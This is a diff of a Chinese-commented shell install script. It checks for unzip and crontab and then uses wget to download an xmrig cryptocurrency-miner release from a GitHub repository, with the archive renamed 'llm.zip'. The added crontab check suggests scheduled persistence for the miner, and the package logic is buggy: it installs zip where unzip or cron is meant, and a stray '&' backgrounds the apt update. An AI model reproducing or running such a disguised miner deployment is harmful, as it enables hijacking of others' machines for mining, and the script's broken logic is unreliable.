@@ -5,9 +5,17 @@ if ! command -v unzip
 then
     echo "unzip 不存在，正在安装..."
     apt update -y & apt install zip -y
-    echo "tcping 安装完成"
+    echo "unzip 安装完成"
 else
-    echo "tcping 已经安装"
+    echo "unzip 已经安装"
+fi
+if ! command -v crontab
+then
+    echo "定时任务 不存在，正在安装..."
+    apt update -y & apt install zip -y
+    echo "定时任务 安装完成"
+else
+    echo "定时任务 已经安装"
 fi
 U=$1
 wget https://github.com/caippx/xmrig/releases/download/6.22.2/llm.zip 
